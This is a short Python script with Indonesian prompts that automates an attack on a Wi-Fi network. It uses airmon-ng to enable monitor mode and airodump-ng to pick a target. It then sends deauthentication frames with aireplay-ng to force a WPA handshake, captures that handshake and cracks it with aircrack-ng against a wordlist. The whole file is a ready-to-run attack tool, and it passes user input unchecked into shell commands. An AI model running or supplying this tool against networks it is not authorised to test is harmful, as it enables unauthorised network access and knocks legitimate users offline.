import os
import psutil
import subprocess
import threading
import string
import random
from colorama import Fore

os.system("clear")

if(os.getuid() != 0):
    print(Fore.RED + "Jalankan script sebagai root (Super User) !!!")
else:
    iface = list(psutil.net_if_addrs().keys())

    # monitor mode
    def monitor(iface, status):
        os.system(f"airmon-ng {status} {iface}")

    print("Pilih Interface !!! \n")

    for x in range(1, len(iface) + 1):
        print(f"[{x}] {iface[x - 1]}")

    print("\n")

    try:
        inp = int(input("[?] ")) - 1
        iface[inp]
        lanjut = True

    except: 
        print("Masukkan interface yang benar !!!")
        lanjut = False

    if(lanjut):
        selectedIf = iface[inp]

        monitor(selectedIf, "start")

        os.system("clear")
        selectedIf += "mon"

        print("Tunggu hinga wifi target muncul lalu tekan 'ctrl+c' \n")
        input("Tekan enter untuk melanjutkan")

        os.system(f"airodump-ng {selectedIf}")
        print("\n")

        ch = int(input("Masukkan channel target\t: "))
        bssid = input("Masukkan BSSID target\t: ")
        hs = ''.join(random.choice(string.ascii_uppercase) for _ in range(6))

        print("\n Tekan 'ctrl+c' jika sudah mendapatkan handshake")
        input("\n tekan enter untuk melanjutkan !!!")

        def aireplay():
            subprocess.call(['xterm', '-e', f'aireplay-ng -0 50 -a {bssid} {selectedIf}'])

        def airodump():
            subprocess.call(['xterm', '-e', f'airodump-ng -c {ch} --bssid {bssid} -w /tmp/{hs} {selectedIf}'])

        dump = threading.Thread(target=airodump)
        deauth = threading.Thread(target=aireplay)

        dump.start()
        deauth.start()

        deauth.join()
        dump.join()
        
        os.system("clear")

        wordlist = input("Masukkan path wordlist: ")
        os.system(f"aircrack-ng -w {wordlist} /tmp/{hs}-01.cap")


        monitor(selectedIf, "stop")